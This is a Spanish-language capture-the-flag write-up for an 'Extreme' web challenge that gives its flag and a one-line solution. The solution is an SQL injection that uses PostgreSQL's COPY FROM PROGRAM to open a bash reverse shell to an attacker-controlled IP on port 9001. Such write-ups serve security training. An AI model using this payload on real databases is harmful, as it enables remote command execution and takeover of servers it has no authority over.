# Nombre: `Colores favoritos`
### Dificultad: `Extreme (🃏🃏🃏🃏🃏)`
### Categoría: `web`
### Autor: [a-maccormack](https://github.com/a-maccormack)
### Flag: `DCCTF{1_c4n_3v3n_sh3ll_ur_db!}`

## Descripción
Mismo sitio, mismo input, más difícil. Ya no basta con conseguir la contraseña de admin. Debes conseguir una shell en el servidor de la base de datos.

`http://127.0.0.1:3000`

## Solución
El sitio no tiene ningún tipo de Web-App-Firewall (WAF), por lo que es posible escribir en la base de datos y desde ahí spawnear una shell.
Seteando un listener en el puerto 9001, y siendo x.x.x.x nuestra ip accesible públicamente, se puede obtener una shell con la siguiente inyección:
`admin';DROP TABLE IF EXISTS pwn;CREATE TABLE pwn(data text);COPY pwn FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/x.x.x.x/9001 0>&1"';--`
